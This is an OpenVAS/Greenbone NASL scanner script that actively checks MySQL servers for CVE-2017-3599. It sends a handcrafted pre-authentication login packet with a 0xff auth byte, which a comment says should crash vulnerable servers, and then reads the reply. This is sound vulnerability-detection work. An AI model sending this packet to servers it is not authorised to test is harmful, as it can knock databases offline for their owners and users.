# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:oracle:mysql";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.810773");
  script_version("2025-09-09T05:38:49+0000");
  script_cve_id("CVE-2017-3599");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2025-09-09 05:38:49 +0000 (Tue, 09 Sep 2025)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)");
  script_tag(name:"creation_date", value:"2017-05-04 11:10:40 +0530 (Thu, 04 May 2017)");
  script_name("Oracle MySQL Server Integer Overflow Vulnerability (cpuapr2017) - Active Check");
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_category(ACT_ATTACK);
  script_family("Databases");
  # nb: Seems MariaDB wasn't affected so only checking MySQL is expected
  script_dependencies("gb_mysql_mariadb_remote_detect.nasl");
  script_require_ports("Services/mysql", 3306);
  script_mandatory_keys("oracle/mysql/remote/detected");

  script_xref(name:"URL", value:"http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/97754");
  script_xref(name:"URL", value:"https://www.secforce.com/blog/2017/04/cve-2017-3599-pre-auth-mysql-remote-dos");

  script_tag(name:"summary", value:"Oracle MySQL Server is prone to an integer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted request and analyse the
  response to confirm the vulnerability.");

  script_tag(name:"insight", value:"Upon connection from a client, the server
  sends a greeting message and the client continues the communication by
  starting the authentication process. The authentication packet sent by
  the client contains a wealth of information including the client
  capabilities, username, password, etc. The packet is received by the
  server, and parsed by 'parse_client_handshake_packet()' function, in
  '/sql/auth/sql_authentication.cc'.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attacker to cause a denial of service via a crafted authentication packet.");

  script_tag(name:"affected", value:"Oracle MySQL version 5.6.x branch up to 5.6.35
  and 5.7.X branch up to 5.7.17.");

  script_tag(name:"solution", value:"Upgrade to MySQL 5.6.36, 5.7.18 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");

  exit(0);
}

include("byte_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"mysql"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

if(get_kb_item("MySQL/" + port + "/blocked"))
  exit(0);

sock = open_sock_tcp(port);
if(!sock)
  exit(0);

res = recv(socket:sock, length:1024);
if("mysql_native_password" >!< res) {
  close(sock);
  exit(0);
}

set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);

# Login request packet
plen = string('\x26\x00\x00');               # 3 Bytes Packet length
packet_num = string('\x01');                 # 1 byte  Packet number
packet_cap = string('\x85\xa2\xbf\x01');     # client capabilities (default)
packet_max = string('\x00\x00\x00\x01');     # max packet size (default)
packet_cset = string('\x21');                # charset (default)
p_reserved =  crap(data:'\x00', length:23);  # 23 bytes reserved with nulls (default)
packet_usr =  string('test\x00');            # username null terminated (default)
packet_auth  = string('\xff');               # Both \xff and \xfe should crash the server
                                             # Tested on vulnerable version crash is
                                             # not happening so the script category is ACT_ATTACK
## complete request
packet = packet_cap + packet_max + packet_cset + p_reserved + packet_usr + packet_auth;

## Add packet length and number
request = plen + packet_num + packet;

## Send full request.
send(socket:sock, data:request);
res = recv( socket:sock, length:1024);

close(sock);

## Patched/Fixed response is "Bad handshake'
if("08S01Bad handshake" >< res)
  exit(0);

## The expected value is the password, which could be of two different formats
## (null terminated or length encoded) depending on the client functionality.
if(strlen(res) > 26 && "mysql_native_password" >< res) {
  security_message(port:port);
  exit(0);
}

exit(99);
